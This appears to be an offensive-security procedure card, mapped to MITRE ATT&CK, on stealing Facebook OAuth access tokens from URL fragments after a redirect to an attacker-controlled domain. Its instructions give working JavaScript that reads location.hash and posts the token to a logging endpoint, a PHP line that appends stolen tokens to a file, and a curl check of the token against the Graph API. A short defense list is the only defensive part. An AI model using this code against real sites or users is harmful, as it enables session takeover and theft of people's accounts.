---
id: proc-4
tags:
  - token-theft
  - javascript
  - logging
type: procedure
tools: []
tactics:
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Application Access Token]]'
updated_at: '2025-12-14T17:24:35.289Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Application Access Token]]'
---
# Capture-Stolen-Access-Token

## Summary

This procedure uses JavaScript on the attacker's server to extract the Facebook access_token from the URL fragment after the OAuth redirect and logs it server-side for exfiltration and use in impersonation attacks.

## Description

Upon redirect to the custom domain (e.g., https://attacker-domain.com/phame/live/47/#access_token=ABC123), client-side JavaScript parses the location.hash, extracts the token, and sends it to the server via AJAX or a hidden form. The server stores it in a file (e.g., log.txt) accessible only to the attacker. This enables full takeover of the victim's Facebook session and linked Phabricator access. Prerequisites: Configured server with JS logging. Outcome: Persistent storage of stolen tokens.

## Requirements

1. Web server on custom domain with JavaScript execution (e.g., simple HTML/JS page)
2. Server-side endpoint for logging (e.g., PHP script to append to file)
3. Access to retrieve logs post-capture

## Defense

Defensive measures and detection strategies:

- Strip URL fragments in all redirects and validate anchors server-side
- Monitor for anomalous JS executions or POSTs from OAuth redirect pages
- Use token binding or short-lived tokens in OAuth flows

## Objectives

1. Extract token from preserved URL fragment
2. Transmit and store token securely on attacker infrastructure
3. Validate token for immediate or future use

## Instructions

### Step 1: Implement Client-Side Extraction

**Context**: Add JavaScript to the blog post page to read and send the token.

Embed JS: var hash = window.location.hash; var tokenMatch = hash.match(/access_token=([^&]+)/); if (tokenMatch) { fetch('/log.php', {method: 'POST', body: 'token=' + tokenMatch[1]}); }

> Edit server HTML/JS. Expected: Script parses #access_token on load.

### Step 2: Set Up Server-Side Logging

**Context**: Create an endpoint to receive and store the token.

On server (e.g., PHP): <?php file_put_contents('log.txt', $_POST['token'] . '\n', FILE_APPEND); ?>

> Server configuration. Expected: POST requests append tokens to log.txt.

### Step 3: Retrieve and Validate Token

**Context**: Access the log and test the token's validity.

Visit http://attacker-domain.com/log.txt to view stored tokens. Test via Facebook Graph API (e.g., curl -H "Authorization: Bearer TOKEN" https://graph.facebook.com/me).

> Manual retrieval. Expected: Log contains valid token; API returns user data.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[Application Access Token]]

### Sub-Techniques

- None

## Commands Used

- None

## Tools Used

- None

## Tags

- [[token-theft]]
- [[JavaScript]]
- [[logging]]
